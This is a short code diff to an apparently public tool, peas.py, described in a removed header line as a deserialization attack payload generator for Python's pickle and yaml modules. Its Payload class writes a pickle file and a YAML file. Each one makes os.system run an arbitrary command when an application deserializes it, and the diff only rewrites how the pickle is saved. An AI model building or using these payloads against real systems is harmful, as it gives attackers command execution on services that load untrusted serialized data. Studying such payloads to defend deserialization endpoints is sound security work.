@@ -1,4 +1,3 @@
-# Python Deserialization attack payload file generator for pickle and yaml module by j0lt
 # Requirements : Python 3
 # Usage : python peas.py
 
@@ -13,7 +12,8 @@ class Payload(object):
         self.location = location
 
     def pick(self):
-        pickle.dump((os.system, (self.cmd,)), open(self.location .__add__("_pick"), "wb"))
+        by = pickle.dumps((os.system, (self.cmd,)))
+        open(self.location.__add__("_pick"), "wb").write(by)
 
     def ya(self):
         open(self.location.__add__("_yaml"), "wb").write(bytes("!!python/object/apply:os.system ['{}']".format(self.cmd), "utf-8"))
